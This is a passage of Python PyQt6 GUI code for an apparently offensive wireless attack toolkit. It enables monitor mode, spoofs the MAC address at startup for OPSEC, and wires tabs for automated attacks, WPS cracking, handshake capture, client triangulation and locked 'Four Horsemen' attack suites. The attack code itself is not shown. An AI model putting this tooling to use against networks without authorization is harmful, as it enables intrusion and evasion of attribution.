                result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=2)
                for line in result.stdout.split('\n'):
                    if 'Mode:Monitor' in line or 'mon' in line.lower():
                        iface = line.split()[0]
                        mode = "Monitor"
                        break
                    elif 'IEEE 802.11' in line or 'ESSID' in line:
                        if not iface:  # Only set if we haven't found monitor mode
                            iface = line.split()[0]
                            mode = "Managed"
            except:
                pass

            # Fallback: check for wlan interfaces
            if not iface:
                try:
                    result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True, timeout=2)
                    for line in result.stdout.split('\n'):
                        if 'wlan' in line or 'wlp' in line:
                            match = re.search(r'^\d+:\s+([^:]+):', line)
                            if match:
                                iface = match.group(1)
                                break
                except:
                    pass

            if not iface:
                self.iface_label.setText("Interface: None Found")
                self.mac_label.setText("MAC: N/A")
                self.mode_label.setText("Mode: N/A")
                self.driver_label.setText("Driver: N/A")
                self.spoofed_mac_label.setText("Spoofed: N/A")
                return

            # Update interface name
            self.iface_label.setText(f"Interface: {iface}")

            # Get MAC address
            mac = "Unknown"
            try:
                result = subprocess.run(['cat', f'/sys/class/net/{iface}/address'],
                                      capture_output=True, text=True, timeout=1)
                if result.returncode == 0:
                    mac = result.stdout.strip().upper()
            except:
                pass
            self.mac_label.setText(f"MAC: {mac}")

            # Check if MAC is spoofed (compare with permanent MAC)
            try:
                result = subprocess.run(['ethtool', '-P', iface],
                                      capture_output=True, text=True, timeout=1)
                if result.returncode == 0:
                    perm_mac = result.stdout.split(':')[-6:]
                    perm_mac = ':'.join(perm_mac).strip().upper()
                    if perm_mac != mac and perm_mac != "00:00:00:00:00:00":
                        self.spoofed_mac_label.setText(f"Spoofed: Yes (Real: {perm_mac})")
                    else:
                        self.spoofed_mac_label.setText("Spoofed: No")
                else:
                    self.spoofed_mac_label.setText("Spoofed: Unknown")
            except:
                self.spoofed_mac_label.setText("Spoofed: Unknown")

            # Update mode
            self.mode_label.setText(f"Mode: {mode}")

            # Get driver info
            driver = "Unknown"
            try:
                driver_path = f'/sys/class/net/{iface}/device/driver'
                result = subprocess.run(['readlink', '-f', driver_path],
                                      capture_output=True, text=True, timeout=1)
                if result.returncode == 0:
                    driver = result.stdout.strip().split('/')[-1]
            except:
                pass
            self.driver_label.setText(f"Driver: {driver}")

        except Exception as e:
            print(f"[!] Error updating network status: {e}")

    def create_tabs(self):
        """Create the main tab widget"""
        self.tabs = QTabWidget()
        self.tabs.setTabPosition(QTabWidget.TabPosition.West)

        # Use default tab bar for vertical tabs (custom bar is for horizontal only)
        # custom_tab_bar = MultiRowTabBar()
        # self.tabs.setTabBar(custom_tab_bar)

        # Enable multi-row tab display (up to 3 rows)
        from PyQt6.QtCore import Qt
        self.tabs.setUsesScrollButtons(False)  # Disable scroll buttons to allow wrapping
        self.tabs.tabBar().setExpanding(False)  # Don't force expand to allow natural wrapping
        self.tabs.tabBar().setElideMode(Qt.TextElideMode.ElideNone)  # Don't truncate tab text
        self.tabs.tabBar().setDrawBase(False)  # Better appearance for multi-row tabs

        # Create tabs
        self.dashboard_tab = DashboardTab()
        self.scanner_tab = ScannerTab()
        self.wps_networks_tab = WPSNetworksTab()  # NEW TAB for WPS-enabled networks
        self.unassociated_clients_tab = UnassociatedClientsTab()  # NEW TAB for rogue clients

        # Import and create attack tabs
        from .auto_attack_tab import AutoAttackTab
        from .manual_attack_tab import ManualAttackTab
        from .bluetooth_tab import BluetoothTab
        from .flipper_tab import FlipperTab
        from .wigle_tab import WiGLETab
        from .ap_mapping_tab import APMappingTab
        from .client_mapping_tab import ClientMappingTab
        from .handshake_viewer_tab import HandshakeViewerTab
        from .triangulation_nodes_tab import TriangulationNodesTab
        from .widgets.attack_queue_widget import AttackQueueWidget
        self.auto_attack_tab = AutoAttackTab()
        self.manual_attack_tab = ManualAttackTab()
        self.attack_queue_tab = AttackQueueWidget()  # Full attack queue tab
        self.bluetooth_tab = BluetoothTab()
        self.flipper_tab = FlipperTab(self)

        self.database_tab = DatabaseTab()
        self.wigle_tab = WiGLETab()
        self.ap_mapping_tab = APMappingTab()
        self.client_mapping_tab = ClientMappingTab()
        self.triangulation_nodes_tab = TriangulationNodesTab()
        self.handshake_viewer_tab = HandshakeViewerTab()
        self.tools_tab = ToolsTab()
        self.settings_tab = SettingsTab()

        # ========== THE FOUR HORSEMEN OF THE APOCALYPSE ==========
        self.conquest_tab = ConquestTab()  # First Horseman - White Horse
        self.war_tab = WarTab()            # Second Horseman - Red Horse
        self.famine_tab = FamineTab()      # Third Horseman - Black Horse
        self.death_tab = DeathTab()        # Fourth Horseman - Pale Horse

        # Connect scanner tab to main window (for accessing other tabs)
        self.scanner_tab.set_main_window(self)
        self.scanner_tab.set_unassociated_clients_tab(self.unassociated_clients_tab)

        # Connect auto attack tab to main window (for stopping scanner before attacks)
        self.auto_attack_tab.set_main_window(self)

        # Connect unassociated clients tab to main window
        self.unassociated_clients_tab.main_window = self

        # Connect dashboard compact queue to switch to full queue tab
        self.dashboard_tab.compact_queue.view_full_queue.connect(
            lambda: self.tabs.setCurrentWidget(self.attack_queue_tab)
        )

        # Connect settings tab to main window
        self.settings_tab.set_main_window(self)
        self.settings_tab.set_current_theme(self.current_theme)
        self.settings_tab.load_dynamic_theme_state()  # Load dynamic theme checkbox state
        self.settings_tab.load_auto_spoof_mac_state()  # Load auto-spoof MAC checkbox state
        self.settings_tab.load_minimize_to_tray_state()  # Load minimize-to-tray checkbox state
        self.settings_tab.load_blacklist_state()  # Load blacklist state

        # Add tabs (with ANSI icons for regular tabs)
        self.tabs.addTab(self.dashboard_tab, "📊 Dashboard")
        self.tabs.addTab(self.scanner_tab, "📡 Scanner")
        self.tabs.addTab(self.attack_queue_tab, "🎯 Attack Queue")  # NEW: Attack Queue tab
        self.tabs.addTab(self.wps_networks_tab, "🔓 WPS Networks")
        self.tabs.addTab(self.unassociated_clients_tab, "👥 Unassociated Clients")
        self.tabs.addTab(self.ap_mapping_tab, "🗺️ AP Mapping")
        self.tabs.addTab(self.client_mapping_tab, "👤 Client Mapping")
        self.tabs.addTab(self.triangulation_nodes_tab, "📐 Triangulation Nodes")
        self.tabs.addTab(self.handshake_viewer_tab, "🤝 Handshakes")
        self.tabs.addTab(self.auto_attack_tab, "🤖 Auto Attack")
        self.tabs.addTab(self.manual_attack_tab, "🎯 Manual Attack")
        self.tabs.addTab(self.bluetooth_tab, "🔵 Bluetooth")
        self.tabs.addTab(self.flipper_tab, "🐬 Flipper Zero")
        self.tabs.addTab(self.database_tab, "💾 Database")
        self.tabs.addTab(self.wigle_tab, "🌍 WiGLE")
        self.tabs.addTab(self.tools_tab, "🔧 Tools")
        self.tabs.addTab(self.settings_tab, "⚙️ Settings")

        # ========== THE FOUR HORSEMEN - ALL THE WAY TO THE RIGHT ==========
        # These tabs are locked by default and require sudo to unlock
        self.horsemen_unlocked = self.check_horsemen_unlocked()

        if self.horsemen_unlocked:
            # Use custom PNG icons for Four Horsemen tabs
            from PyQt6.QtGui import QIcon
            from pathlib import Path

            icons_dir = Path(__file__).parent.parent.parent / "assets" / "icons"

            # Conquest (Pestilence)
            self.conquest_tab_index = self.tabs.addTab(self.conquest_tab, "🏹 CONQUEST")
            if (icons_dir / "pestilence.png").exists():
                icon = QIcon(str(icons_dir / "pestilence.png"))
                if not icon.isNull():
                    self.tabs.setTabIcon(self.conquest_tab_index, icon)
                    print(f"[+] Loaded CONQUEST icon from {icons_dir / 'pestilence.png'}")
                else:
                    print(f"[!] Failed to load CONQUEST icon - using emoji fallback")
            else:
                print(f"[!] CONQUEST icon not found at {icons_dir / 'pestilence.png'}")

            # War
            self.war_tab_index = self.tabs.addTab(self.war_tab, "⚔️ WAR")
            if (icons_dir / "war.png").exists():
                icon = QIcon(str(icons_dir / "war.png"))
                if not icon.isNull():
                    self.tabs.setTabIcon(self.war_tab_index, icon)
                    print(f"[+] Loaded WAR icon from {icons_dir / 'war.png'}")
                else:
                    print(f"[!] Failed to load WAR icon - using emoji fallback")
            else:
                print(f"[!] WAR icon not found at {icons_dir / 'war.png'}")

            # Famine
            self.famine_tab_index = self.tabs.addTab(self.famine_tab, "⚖️ FAMINE")
            if (icons_dir / "famine.png").exists():
                icon = QIcon(str(icons_dir / "famine.png"))
                if not icon.isNull():
                    self.tabs.setTabIcon(self.famine_tab_index, icon)
                    print(f"[+] Loaded FAMINE icon from {icons_dir / 'famine.png'}")
                else:
                    print(f"[!] Failed to load FAMINE icon - using emoji fallback")
            else:
                print(f"[!] FAMINE icon not found at {icons_dir / 'famine.png'}")

            # Death
            self.death_tab_index = self.tabs.addTab(self.death_tab, "💀 DEATH")
            if (icons_dir / "death.png").exists():
                icon = QIcon(str(icons_dir / "death.png"))
                if not icon.isNull():
                    self.tabs.setTabIcon(self.death_tab_index, icon)
                    print(f"[+] Loaded DEATH icon from {icons_dir / 'death.png'}")
                else:
                    print(f"[!] Failed to load DEATH icon - using emoji fallback")
            else:
                print(f"[!] DEATH icon not found at {icons_dir / 'death.png'}")

            # Apply hazardous styling to these tabs
            self.apply_horsemen_tab_styling()
        else:
            # Add locked placeholder tabs
            locked_widget = QWidget()
            locked_layout = QVBoxLayout()
            locked_label = QLabel(
                "🔒 FOUR HORSEMEN LOCKED 🔒\n\n"
                "⚠️ DANGER: APOCALYPTIC ATTACK PROTOCOLS ⚠️\n\n"
                "These attack suites are LOUD, AGGRESSIVE, and DANGEROUS.\n"
                "They will be detected. Use only with explicit authorization.\n\n"
                "Unlock in Settings with sudo password."
            )
            locked_label.setStyleSheet("""
                font-size: 18px;
                font-weight: bold;
                color: #ff0000;
                background-color: #1a0000;
                padding: 40px;
                border: 5px solid #ff0000;
                border-radius: 10px;
            """)
            locked_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
            locked_label.setWordWrap(True)
            locked_layout.addWidget(locked_label)
            locked_widget.setLayout(locked_layout)

            self.tabs.addTab(locked_widget, "🔒 HORSEMEN")

        # Add tab click tracking for debugging crashes
        self.tabs.currentChanged.connect(self._on_tab_changed)

        self.setCentralWidget(self.tabs)

    def _on_tab_changed(self, index):
        """Log tab changes for crash debugging"""
        from datetime import datetime
        tab_name = self.tabs.tabText(index)
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        print(f"[{timestamp}] [TAB-CHANGE] Switched to: {tab_name} (index: {index})")

    def create_status_bar(self):
        """Create the status bar with network interface info and system stats"""
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)

        # Add network interface labels (if they exist - created in create_network_status_bar())
        if hasattr(self, 'iface_label'):
            self.status_bar.addPermanentWidget(self.iface_label)
            self.status_bar.addPermanentWidget(self._create_separator())
            self.status_bar.addPermanentWidget(self.mac_label)
            self.status_bar.addPermanentWidget(self._create_separator())
            self.status_bar.addPermanentWidget(self.spoofed_mac_label)
            self.status_bar.addPermanentWidget(self._create_separator())
            self.status_bar.addPermanentWidget(self.mode_label)
            self.status_bar.addPermanentWidget(self._create_separator())
            self.status_bar.addPermanentWidget(self.driver_label)
            self.status_bar.addPermanentWidget(self._create_separator())

        # Service status labels
        self.service_status_labels = {}

        # Database service
        self.service_status_labels['database'] = QLabel("💾 DB: --")
        self.service_status_labels['database'].setStyleSheet("color: #999; font-size: 11px;")
        self.service_status_labels['database'].setToolTip("Database Service")

        # GPS service
        self.service_status_labels['gps'] = QLabel("📍 GPS: --")
        self.service_status_labels['gps'].setStyleSheet("color: #999; font-size: 11px;")
        self.service_status_labels['gps'].setToolTip("GPS Service - Click to view settings")
        self.service_status_labels['gps'].setMouseTracking(False)
        # Don't override mousePressEvent - it can cause issues

        # Scanner service
        self.service_status_labels['scanner'] = QLabel("📡 Scan: --")
        self.service_status_labels['scanner'].setStyleSheet("color: #999; font-size: 11px;")
        self.service_status_labels['scanner'].setToolTip("WiFi Scanner Service")

        # Upsert service
        self.service_status_labels['upsert'] = QLabel("⬆️ Sync: --")
        self.service_status_labels['upsert'].setStyleSheet("color: #999; font-size: 11px;")
        self.service_status_labels['upsert'].setToolTip("Database Sync Service")

        # Triangulation service
        self.service_status_labels['triangulation'] = QLabel("📐 Tri: --")
        self.service_status_labels['triangulation'].setStyleSheet("color: #999; font-size: 11px;")
        self.service_status_labels['triangulation'].setToolTip("Triangulation Service")

        # WPS cracking service
        self.service_status_labels['wps_cracking'] = QLabel("🔓 WPS: --")
        self.service_status_labels['wps_cracking'].setStyleSheet("color: #999; font-size: 11px;")
        self.service_status_labels['wps_cracking'].setToolTip("WPS Cracking Service")

        # Add all service labels to status bar
        for key in ['database', 'gps', 'scanner', 'upsert', 'triangulation', 'wps_cracking']:
            self.status_bar.addPermanentWidget(self.service_status_labels[key])
            if key != 'wps_cracking':  # Don't add separator after last item
                self.status_bar.addPermanentWidget(self._create_separator())

        # System status labels
        self.status_bar.addPermanentWidget(self._create_separator())
        self.status_time_label = QLabel("Time: --:--:--")
        self.status_time_label.setStyleSheet("font-size: 11px;")
        self.status_cpu_label = QLabel("CPU: --%")
        self.status_cpu_label.setStyleSheet("font-size: 11px;")
        self.status_mem_label = QLabel("MEM: --%")
        self.status_mem_label.setStyleSheet("font-size: 11px;")

        self.status_bar.addPermanentWidget(self.status_time_label)
        self.status_bar.addPermanentWidget(self.status_cpu_label)
        self.status_bar.addPermanentWidget(self.status_mem_label)

        self.status_bar.showMessage("Ready")

        # Track last GPS location for pulse effect
        self.last_gps_location = None
        self.gps_pulse_active = False

        # Delay service status timer start until after GUI is fully loaded
        self.service_status_timer = QTimer()
        self.service_status_timer.timeout.connect(self._update_service_status)
        self.service_status_timer.setSingleShot(True)
        QTimer.singleShot(2000, lambda: self.service_status_timer.start(1000))  # Start after 2s delay

        # Attack queue update timer (update every 2 seconds)
        self.queue_update_timer = QTimer()
        self.queue_update_timer.timeout.connect(self.update_attack_queue_displays)
        QTimer.singleShot(3000, lambda: self.queue_update_timer.start(2000))  # Start after 3s delay, update every 2s

    def init_system_tray(self):
        """Initialize system tray icon and notifications"""
        from .system_tray import SystemTrayIcon, NotificationManager
        from src.services.core_service import get_service

        # Create notification manager
        self.notification_manager = NotificationManager()

        # NOTE: System tray icon is managed by the standalone tray app (src/tray_app.py)
        # to prevent duplicate tray icons. The GUI runs as a window only.
        # The notification manager will fall back to dialog notifications.
        print("[*] Notification manager initialized (tray icon managed by standalone tray app)")

        # Link core service notifications (even without tray, we can handle notifications)
        try:
            core_service = get_service()
            core_service.on_system_tray_notify = self._handle_service_notification
            print("[+] Notification handler linked to core orchestrator service")
        except Exception as e:
            print(f"[!] Warning: Could not link notification handler to core service: {e}")

    def on_tray_start_scan(self):
        """Handle start scan from system tray"""
        if hasattr(self.scanner_tab, 'start_scan'):
            self.scanner_tab.start_scan()

    def on_tray_stop_scan(self):
        """Handle stop scan from system tray"""
        if hasattr(self.scanner_tab, 'stop_scan'):
            self.scanner_tab.stop_scan()

    def on_configure_cards(self):
        """Handle configure wireless cards from system tray"""
        from .card_config_dialog import CardConfigDialog
        from src.services.wireless_card_manager import get_card_manager

        try:
            # Get card manager
            card_manager = get_card_manager()

            # Detect current cards
            card_manager.detect_cards()
            cards = card_manager.get_all_cards()

            if not cards:
                from PyQt6.QtWidgets import QMessageBox
                QMessageBox.information(
                    self,
                    "No Wireless Cards",
                    "No wireless network adapters detected.\n\n"
                    "Please ensure wireless cards are properly connected."
                )
                return

            # Convert cards to dict format for dialog
            card_dicts = [card.to_dict() for card in cards]

            # Show configuration dialog
            dialog = CardConfigDialog(card_dicts, self)
            dialog.roles_updated.connect(self._on_card_roles_updated)

            if dialog.exec():
                # Get role assignments
                roles = dialog.get_role_assignments()
                print(f"[*] Card roles updated: {roles}")

        except Exception as e:
            from PyQt6.QtWidgets import QMessageBox
            QMessageBox.critical(
                self,
                "Error",
                f"Failed to open card configuration:\n{str(e)}"
            )
            print(f"[!] Card config error: {e}")
            import traceback
            traceback.print_exc()

    def _on_card_roles_updated(self, roles: dict):
        """Handle card role updates from dialog"""
        from src.services.wireless_card_manager import get_card_manager, CardRole

        try:
            card_manager = get_card_manager()

            # Apply role changes
            for interface, role_str in roles.items():
                # Convert string to CardRole enum
                role_map = {
                    "scanner": CardRole.SCANNER,
                    "attacker": CardRole.ATTACKER,
                    "both": CardRole.BOTH,
                    "unassigned": CardRole.UNASSIGNED
                }
                role = role_map.get(role_str, CardRole.UNASSIGNED)

                # Assign role
                card_manager.assign_role(interface, role)

                # Notify
                self.notification_manager.notify_card_role_changed(interface, role_str)

            print("[+] Card roles applied successfully")

        except Exception as e:
            print(f"[!] Failed to apply card roles: {e}")

    def _handle_service_notification(self, title: str, message: str):
        """Handle notifications from core service and route to system tray"""
        if self.notification_manager:
            # Determine urgency and notification type based on title
            urgency = "normal"
            notification_type = None

            if "Card Detected" in title or "Card Added" in title:
                notification_type = self.notification_manager.WIRELESS_CARD_ADDED
                urgency = "normal"
            elif "Card Removed" in title:
                notification_type = self.notification_manager.WIRELESS_CARD_REMOVED
                urgency = "low"
            elif "Error" in title or "Failed" in title:
                urgency = "critical"

            self.notification_manager.notify(
                title,
                message,
                notification_type=notification_type,
                urgency=urgency
            )

    def start_monitoring(self):
        """Start status monitoring"""
        self.status_monitor = StatusMonitor()
        self.status_monitor.status_updated.connect(self.update_status)
        self.status_monitor.start()

    def init_monitor_mode(self):
        """Auto-detect and enable monitor mode on WiFi interface"""
        from ..tools.wifi_monitor import WiFiMonitorManager
        from PyQt6.QtWidgets import QMessageBox, QInputDialog

        print("\n[*] Initializing WiFi monitor mode...")

        # First, check if there's already a monitor mode interface
        existing_monitor = WiFiMonitorManager.get_monitor_interface()

        if existing_monitor:
            print(f"[+] Found existing monitor interface: {existing_monitor}")
            print(f"[*] Using existing monitor mode interface")

            # Use existing monitor interface
            self.scanner_tab.set_monitor_interface(existing_monitor)
            self.statusBar().showMessage(f"Monitor mode ready on {existing_monitor}", 5000)

            # Update Dashboard status
            self.dashboard_tab.update_monitor_status(existing_monitor)
            self.dashboard_tab.update_scanner_status("Ready (Orchestrator)")

            # GUI is now a viewer only - orchestrator manages scanning
            print(f"[*] Monitor interface detected: {existing_monitor}")
            print(f"[i] GUI is in viewer mode - orchestrator manages scanning")
            print(f"[i] Check orchestrator status: cat /tmp/gattrose-status.json")

            # DON'T auto-start scanner - that's the orchestrator's job!
            # BUT we DO need minimal stats polling (tree updates via real-time events)
            print(f"[*] Starting minimal stats polling for orchestrator data...")
            if not self.scanner_tab.db_poll_timer:
                from PyQt6.QtCore import QTimer
                self.scanner_tab.db_poll_timer = QTimer()
                self.scanner_tab.db_poll_timer.timeout.connect(self.scanner_tab.poll_database)
                self.scanner_tab.db_poll_timer.start(3000)  # Poll every 3 seconds for responsive live updates
                print(f"[✓] Live data polling started (3s) - Real-time updates via events")

            return

        # Get all wireless interfaces
        interfaces = WiFiMonitorManager.get_wireless_interfaces()

        if not interfaces:
            error_msg = "No wireless interfaces detected! Please check:\n\n" \
                       "1. Is your WiFi adapter plugged in?\n" \
                       "2. Run: iw dev\n" \
                       "3. Check: sudo rfkill list\n\n" \
                       "Scanner will not be available."
            print(f"[!] {error_msg}")
            self.statusBar().showMessage("No wireless interfaces found", 10000)
            QMessageBox.warning(self, "No WiFi Adapter", error_msg)
            return

        print(f"[+] Found {len(interfaces)} wireless interface(s): {', '.join(interfaces)}")

        # Filter to managed interfaces only
        managed = [iface for iface in interfaces if 'mon' not in iface.lower() and iface != 'lo']

        if not managed:
            error_msg = "No managed wireless interfaces found.\n\n" \
                       f"Detected interfaces: {', '.join(interfaces)}\n\n" \
                       "All appear to be in monitor mode or virtual."
            print(f"[!] {error_msg}")
            QMessageBox.warning(self, "No Managed Interface", error_msg)
            return

        # Single interface - auto-enable and start
        if len(managed) == 1:
            interface = managed[0]
            print(f"[*] Single interface detected: {interface}")
            print(f"[*] Automatically enabling monitor mode and starting scan...")

            self.enable_monitor_and_scan(interface)

        # Multiple interfaces - ask user
        else:
            print(f"[*] Multiple interfaces detected: {', '.join(managed)}")

            interface, ok = QInputDialog.getItem(
                self,
                "Select WiFi Interface",
                f"Multiple wireless interfaces detected.\n\n"
                f"Select which interface to use for scanning:",
                managed,
                0,
                False
            )

            if ok and interface:
                print(f"[*] User selected: {interface}")
                self.enable_monitor_and_scan(interface)
            else:
                print(f"[!] User cancelled interface selection")
                self.statusBar().showMessage("No interface selected - scanner disabled", 10000)

    def enable_monitor_and_scan(self, interface: str):
        """Enable monitor mode on interface and start scanning"""
        from ..tools.wifi_monitor import WiFiMonitorManager
        from PyQt6.QtWidgets import QMessageBox

        print(f"[*] Enabling monitor mode on {interface}...")
        self.statusBar().showMessage(f"Enabling monitor mode on {interface}...", 3000)

        success, monitor_iface, message = WiFiMonitorManager.enable_monitor_mode(interface)

        print(f"[*] {message}")

        if success and monitor_iface:
            print(f"[+] Monitor mode enabled: {monitor_iface}")

            # Pass monitor interface to scanner tab
            self.scanner_tab.set_monitor_interface(monitor_iface)
            self.statusBar().showMessage(f"Monitor mode ready on {monitor_iface}", 5000)

            # Update Dashboard status
            self.dashboard_tab.update_monitor_status(monitor_iface)
            self.dashboard_tab.update_scanner_status("Ready (Orchestrator)")

            # GUI is viewer only - DON'T start scanner
            print(f"[*] Monitor mode enabled: {monitor_iface}")
            print(f"[i] GUI is in viewer mode - orchestrator manages scanning")
            print(f"[i] Check orchestrator status: cat /tmp/gattrose-status.json")

            # Start minimal stats polling to display orchestrator data
            print(f"[*] Starting minimal stats polling for orchestrator data...")
            if not self.scanner_tab.db_poll_timer:
                from PyQt6.QtCore import QTimer
                self.scanner_tab.db_poll_timer = QTimer()
                self.scanner_tab.db_poll_timer.timeout.connect(self.scanner_tab.poll_database)
                self.scanner_tab.db_poll_timer.start(3000)  # Poll every 3 seconds for responsive live updates
                print(f"[✓] Live data polling started (3s) - Real-time updates via events")

        else:
            error_msg = f"Failed to enable monitor mode on {interface}:\n\n{message}\n\n" \
                       "Try running manually:\n" \
                       f"sudo airmon-ng start {interface}"
            print(f"[!] {error_msg}")
            self.statusBar().showMessage(f"Monitor mode failed: {message}", 10000)
            QMessageBox.critical(self, "Monitor Mode Failed", error_msg)

    def init_mac_spoofing(self):
        """
        Auto-spoof MAC address at boot if enabled in config
        Runs on application startup for OPSEC
        """
        try:
            from ..utils.config_db import DBConfig
            from ..utils.mac_spoof import MACSpoofing

            config = DBConfig()
            auto_spoof_enabled = config.get('app.auto_spoof_mac', 'true')  # Default to true for OPSEC

            if auto_spoof_enabled != 'true':
                print("[*] Auto MAC spoofing disabled in config")
                return

            print("\n[*] Auto-spoofing MAC address at boot...")

            # Get BASE wireless interface (not monitor mode)
            base_interface = None
            monitor_interface = None

            # Try common base interface names
            for iface_name in ['wlp7s0', 'wlan0', 'wlp3s0', 'wlan1']:
                try:
                    with open(f'/sys/class/net/{iface_name}/address', 'r') as f:
                        base_interface = iface_name
                        break
                except FileNotFoundError:
                    # Check if monitor version exists
                    try:
                        with open(f'/sys/class/net/{iface_name}mon/address', 'r') as f:
                            monitor_interface = f'{iface_name}mon'
                            base_interface = iface_name  # Remember base even if it doesn't exist
                            break
                    except FileNotFoundError:
                        continue

            if not base_interface:
                print("[!] No wireless interface found for MAC spoofing")
                return

            # If monitor mode is active, disable it first
            if monitor_interface:
                print(f"[*] Disabling monitor mode on {monitor_interface} before MAC spoofing...")
                from tools.wifi_monitor import WiFiMonitor
                wifi_monitor = WiFiMonitor()
                wifi_monitor.disable_monitor_mode(monitor_interface)

            print(f"[*] Spoofing MAC on {base_interface}...")

            # Spoof MAC address on base interface
            success, message = MACSpoofing.spoof_mac(base_interface, random=True)

            if success:
                print(f"[+] {message}")
                # Re-enable monitor mode if it was active
                if monitor_interface:
                    print(f"[*] Re-enabling monitor mode on {base_interface}...")
                    from tools.wifi_monitor import WiFiMonitor
                    wifi_monitor = WiFiMonitor()
                    new_mon_iface = wifi_monitor.enable_monitor_mode(base_interface)
                    if new_mon_iface:
                        print(f"[+] Monitor mode re-enabled: {new_mon_iface}")
                    else:
                        print(f"[!] Failed to re-enable monitor mode")

                if hasattr(self, 'statusBar'):
                    self.statusBar().showMessage(f"MAC spoofed on {base_interface}", 5000)
            else:
                print(f"[!] MAC spoofing failed: {message}")

        except Exception as e:
            print(f"[!] Error in auto MAC spoofing: {e}")

    def update_status(self, status: dict):
        """Update status bar with system info"""
        if 'error' not in status:
            self.status_time_label.setText(f"Time: {status['time']}")
            self.status_cpu_label.setText(f"CPU: {status['cpu']:.1f}%")
            self.status_mem_label.setText(f"MEM: {status['mem']:.1f}%")

            # Update dashboard
            self.dashboard_tab.update_status(status)

    def update_attack_queue_displays(self):
        """Update both compact and full attack queue widgets with live data"""
        try:
            jobs, stats = self.get_attack_queue_data()

            # Update full queue tab
            if hasattr(self, 'attack_queue_tab'):
                self.attack_queue_tab.update_statistics(stats)
                for job in jobs:
                    self.attack_queue_tab.add_job(job)

            # Update compact queue on dashboard
            if hasattr(self.dashboard_tab, 'compact_queue'):
                self.dashboard_tab.compact_queue.update_queue(jobs, stats)

        except Exception as e:
            print(f"[!] Error updating attack queue displays: {e}")

    def get_attack_queue_data(self):
        """Fetch attack queue data from database/service"""
        try:
            from ..database.manager import get_session
            from ..database.models import AttackJob

            session = get_session()

            # Fetch all active jobs (not cancelled)
            active_jobs = session.query(AttackJob).filter(
                AttackJob.status.in_(['queued', 'running', 'paused'])
            ).order_by(AttackJob.priority.desc()).all()

            # Fetch recently completed/failed for display
            recent_jobs = session.query(AttackJob).filter(
                AttackJob.status.in_(['completed', 'failed'])
            ).order_by(AttackJob.updated_at.desc()).limit(5).all()

            # Combine active + recent
            all_jobs = list(active_jobs) + list(recent_jobs)

            # Convert to dict format
            jobs_list = []
            for job in all_jobs:
                jobs_list.append({
                    'id': job.id,
                    'attack_type': job.attack_type,
                    'target_bssid': job.target_bssid,
                    'target_ssid': job.target_ssid or '',
                    'status': job.status,
                    'priority': job.priority,
                    'progress': getattr(job, 'progress', 0),
                    'attempts': getattr(job, 'attempts', 0),
                    'max_attempts': getattr(job, 'max_attempts', 1),
                    'estimated_duration': getattr(job, 'estimated_duration', 0)
                })

            # Calculate statistics
            stats = {
                'queued': sum(1 for j in all_jobs if j.status == 'queued'),
                'running': sum(1 for j in all_jobs if j.status == 'running'),
                'completed': sum(1 for j in all_jobs if j.status == 'completed'),
                'failed': sum(1 for j in all_jobs if j.status == 'failed')
            }

            session.close()
            return jobs_list, stats

        except Exception as e:
            print(f"[!] Error fetching attack queue data: {e}")
            return [], {'queued': 0, 'running': 0, 'completed': 0, 'failed': 0}

    def center_on_screen(self):
        """Center the window on the screen"""
        screen = self.screen().geometry()
        size = self.geometry()
        self.move(
            (screen.width() - size.width()) // 2,
            (screen.height() - size.height()) // 2
        )

    def check_horsemen_unlocked(self):
        """Check if Four Horsemen tabs are unlocked"""
        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()
            unlocked = config.get('app.horsemen_unlocked', 'false')
            return unlocked == 'true'
        except Exception as e:
            print(f"[!] Error checking horsemen unlock status: {e}")
            return False

    def apply_horsemen_tab_styling(self):
        """Apply hazardous warning styling to Four Horsemen tabs"""
        tab_bar = self.tabs.tabBar()

        # Hazard stripe pattern for tabs (black and yellow warning)
        horsemen_style = """
            QTabBar::tab {{
                min-width: 80px;
            }}
        """

        # Apply specific styles to each horseman tab (using their actual indices)
        # CONQUEST - White with black stripes
        conquest_style = f"""
            QTabBar::tab:nth-child({self.conquest_tab_index + 1}) {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #1a1a1a, stop:0.2 #ffffff, stop:0.4 #1a1a1a,
                    stop:0.6 #ffffff, stop:0.8 #1a1a1a, stop:1 #ffffff);
                color: #ffff00;
                font-weight: bold;
                border: 3px solid #ffffff;
                padding: 8px 12px;
                margin: 2px;
            }}
            QTabBar::tab:nth-child({self.conquest_tab_index + 1}):selected {{
                background: #ffffff;
                color: #000000;
                border: 3px solid #ffff00;
            }}
            QTabBar::tab:nth-child({self.conquest_tab_index + 1}):hover {{
                background: #cccccc;
                color: #000000;
            }}
        """

        # WAR - Red with black stripes
        war_style = f"""
            QTabBar::tab:nth-child({self.war_tab_index + 1}) {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #1a0000, stop:0.2 #ff0000, stop:0.4 #1a0000,
                    stop:0.6 #ff0000, stop:0.8 #1a0000, stop:1 #ff0000);
                color: #ffff00;
                font-weight: bold;
                border: 3px solid #ff0000;
                padding: 8px 12px;
                margin: 2px;
            }}
            QTabBar::tab:nth-child({self.war_tab_index + 1}):selected {{
                background: #ff0000;
                color: #000000;
                border: 3px solid #ffff00;
            }}
            QTabBar::tab:nth-child({self.war_tab_index + 1}):hover {{
                background: #cc0000;
                color: #ffff00;
            }}
        """

        # FAMINE - Gray/black with yellow warning stripes
        famine_style = f"""
            QTabBar::tab:nth-child({self.famine_tab_index + 1}) {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #000000, stop:0.2 #555555, stop:0.4 #000000,
                    stop:0.6 #555555, stop:0.8 #000000, stop:1 #555555);
                color: #ffff00;
                font-weight: bold;
                border: 3px solid #555555;
                padding: 8px 12px;
                margin: 2px;
            }}
            QTabBar::tab:nth-child({self.famine_tab_index + 1}):selected {{
                background: #444444;
                color: #ffff00;
                border: 3px solid #ffff00;
            }}
            QTabBar::tab:nth-child({self.famine_tab_index + 1}):hover {{
                background: #333333;
                color: #ffff00;
            }}
        """

        # DEATH - Toxic green with black stripes (radioactive vibes)
        death_style = f"""
            QTabBar::tab:nth-child({self.death_tab_index + 1}) {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #001a00, stop:0.2 #00ff00, stop:0.4 #001a00,
